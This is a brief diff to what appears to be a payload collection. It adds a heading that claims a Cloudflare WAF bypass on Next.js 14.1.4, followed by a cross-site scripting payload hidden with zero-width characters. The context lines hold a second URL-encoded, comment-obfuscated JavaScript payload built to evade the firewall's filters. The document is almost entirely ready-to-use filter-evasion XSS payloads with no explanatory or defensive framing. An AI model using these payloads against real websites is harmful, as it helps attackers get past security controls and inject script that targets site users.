@@ -1,3 +1,9 @@
+Bypassing Cloudflare WAF on Next.js 14.1.4!
+-------------------------------------------
+‘>alert(154)<​/script><​script/154=’;;;;;;;
+
+
+
 Cloudflare WAF Payload:
 -----------------------
 "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
